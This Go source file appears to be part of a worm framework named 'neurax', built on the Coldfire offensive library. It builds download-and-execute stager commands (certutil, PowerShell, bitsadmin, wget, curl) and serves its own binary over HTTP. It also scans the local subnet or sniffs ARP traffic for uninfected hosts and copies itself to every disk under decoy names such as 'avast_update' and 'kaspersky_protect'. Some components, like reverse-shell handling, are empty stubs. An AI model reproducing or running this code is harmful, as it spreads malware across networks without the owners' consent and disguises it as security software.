package neurax

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	coldfire "github.com/redcode-labs/Coldfire"
)

var infected_hosts = []string{}

type __NeuraxConfig struct {
	stager         string
	port           int
	comm_port      int
	local_ip       string
	path           string
	file_name      string
	platform       string
	cidr           string
	scan_passive   bool
	scan_timeout   int
	read_arp_cache bool
	threads        int
	full_range     bool
	base64         bool
	required_port  int
	verbose        bool
	remove         bool
}

var NeuraxConfig = __NeuraxConfig{
	stager:         "random",
	port:           coldfire.RandomInt(2222, 9999),
	comm_port:      coldfire.RandomInt(2222, 9999),
	required_port:  0,
	local_ip:       coldfire.GetLocalIp(),
	path:           "random",
	file_name:      "random",
	platform:       runtime.GOOS,
	cidr:           coldfire.GetLocalIp() + "/24",
	scan_passive:   false,
	scan_timeout:   2,
	read_arp_cache: false,
	threads:        10,
	full_range:     false,
	base64:         false,
	verbose:        false,
	remove:         false,
}

func ReportError(message string, e error) {
	if e != nil && NeuraxConfig.verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if NeuraxConfig.remove {
			os.Remove(os.Args[0])
		}
	}
}

func NeuraxStager() string {
	stagers := [][]string{}
	stager := []string{}
	paths := []string{}
	b64_decoder := ""
	windows_stagers := [][]string{
		[]string{"certutil", `certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
		[]string{"powershell", `Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
		[]string{"bitsadmin", `bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
	}
	linux_stagers := [][]string{
		[]string{"wget", `wget -O SAVE_PATH/FILENAME URL; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
		[]string{"curl", `curl URL/FILENAME > SAVE_PATH/FILENAME; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
	}
	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
		"/etc/", "/usr/", "/usr/share/"}
	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
	switch NeuraxConfig.platform {
	case "windows":
		stagers = windows_stagers
		paths = windows_save_paths
		if NeuraxConfig.base64 {
			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
	case "linux", "darwin":
		stagers = linux_stagers
		paths = linux_save_paths
		if NeuraxConfig.base64 {
			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
	}
	if NeuraxConfig.stager == "random" {
		stager = coldfire.RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == NeuraxConfig.stager {
				stager = st
			}
		}
	}
	selected_stager_command := stager[1]
	if NeuraxConfig.path == "random" {
		NeuraxConfig.path = coldfire.RandomSelectStr(paths)
	}
	if NeuraxConfig.file_name == "random" && NeuraxConfig.platform == "windows" {
		NeuraxConfig.file_name += ".exe"
	}
	url := fmt.Sprintf("http://%s:%d/%s", NeuraxConfig.local_ip, NeuraxConfig.port, NeuraxConfig.file_name)
	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", NeuraxConfig.file_name, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.path, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
	return selected_stager_command
}

func NeuraxServer() {
	/*if NeuraxConfig.prevent_reinfect {
		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
	}*/
	go handle_comm()
	data, _ := ioutil.ReadFile(os.Args[0])
	if NeuraxConfig.base64 {
		data = []byte(coldfire.B64E(string(data)))
	}
	addr := fmt.Sprintf(":%d", NeuraxConfig.port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		http.ServeContent(rw, r, NeuraxConfig.file_name, time.Now(), bytes.NewReader(data))
	}))
}

func IsHostActive(target string) bool {
	first := 19
	last := 300
	if NeuraxConfig.full_range {
		last = 65535
	}
	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.scan_timeout)*time.Second, NeuraxConfig.threads)
	opened_ports := ps.GetOpenedPort(first, last)
	if len(opened_ports) != 0 {
		if NeuraxConfig.required_port == 0 {
			return true
		} else {
			if coldfire.PortscanSingle(target, NeuraxConfig.required_port) {
				return true
			}
		}
	}
	return false
}

func IsHostInfected(target string) bool {
	if coldfire.Contains(infected_hosts, target) {
		return true
	}
	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.port)
	rsp, err := http.Get(target_url)
	if err != nil {
		return false
	}
	if rsp.StatusCode == 200 {
		infected_hosts = append(infected_hosts, target)
		infected_hosts = coldfire.RemoveFromSlice(infected_hosts, coldfire.GetLocalIp())
		return true
	}
	return false
}

func handle_comm() {

}

func handle_revshell_conn() {

}

//coldfire.SendDataTCP
func NeuraxSignal(host string, port int) {

}

func NeuraxScan(c chan string) {
	if NeuraxConfig.scan_passive {
		var snapshot_len int32 = 1024
		var timeout time.Duration = 500000 * time.Second
		devices, err := pcap.FindAllDevs()
		ReportError("Cannot obtain network interfaces", err)
		for _, device := range devices {
			handler, err := pcap.OpenLive(device.Name, snapshot_len, false, timeout)
			ReportError("Cannot open device", err)
			handler.SetBPFFilter("arp")
			defer handler.Close()
			packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
			for packet := range packetSource.Packets() {
				ip_layer := packet.Layer(layers.LayerTypeIPv4)
				if ip_layer != nil {
					ip, _ := ip_layer.(*layers.IPv4)
					source := fmt.Sprintf("%s", ip.SrcIP)
					destination := fmt.Sprintf("%s", ip.DstIP)
					if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
						c <- source
					}
					if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
						c <- destination
					}
				}
			}
		}
	} else {
		targets := []string{}
		if NeuraxConfig.read_arp_cache {
			for ip, _ := range arp.Table() {
				if !IsHostInfected(ip) {
					targets = append(targets, ip)
				}
			}
		}
		full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.cidr)
		for _, addr := range full_addr_range {
			targets = append(targets, addr)
		}
		targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
		for _, target := range targets {
			if IsHostActive(target) && !IsHostInfected(target) {
				c <- target
			}
		}
	}
}

func NeuraxDisks() error {
	//Probably should use Haikunator here...
	names := []string{"avast_update", "tetris", "kaspersky_protect", "witcher_3_installer"} //TODO: Add more names
	selected_name := coldfire.RandomSelectStr(names)
	if runtime.GOOS == "windows" {
		selected_name += ".exe"
	}
	disks, err := coldfire.Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := coldfire.CopyFile(os.Args[0], d+"/"+selected_name)
		if err != nil {
			return err
		}
	}
	return nil
}
